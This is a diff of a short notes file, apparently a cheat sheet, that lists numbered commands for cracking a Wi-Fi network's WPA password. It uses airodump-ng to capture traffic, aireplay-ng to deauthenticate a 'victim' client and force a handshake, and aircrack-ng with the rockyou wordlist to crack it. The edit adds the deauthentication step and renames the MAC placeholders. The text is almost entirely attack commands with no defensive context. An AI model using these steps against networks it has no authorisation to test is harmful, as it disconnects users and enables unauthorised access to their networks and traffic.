@@ -26,8 +26,9 @@ sudo iwlist <name_interface> scan | grep ESSID
 6  airodump-ng <interface_network>
 7. gettin BSSID and CHANNEL with more power
 8.  monitorin of specify red with airodump-ng --bssid <BSSID> --channel <#> -w [name_register_data] <interface_network>
-airodump-ng -c<#channel> -w capture-Pat -d <mac-address_victim> wlan0
+8.1 airodump-ng -c<#channel> -w capture-Pat -d <mac-ap> wlan0
+8.2 aireplay-ng --deauth 5 -a <mac access point> -c <mac-address-victim> wlo1
 9. Once capture handshake apply
 aircrack-ng -w /usr/share/wordlist/rockyou.txt <file.cap>
 example:
-aircrack-ng -w password.lst -b <mac_victim> <file.pcap or file.cap>
+aircrack-ng -w password.lst -b <mac_ap_victim> <file.pcap or file.cap>
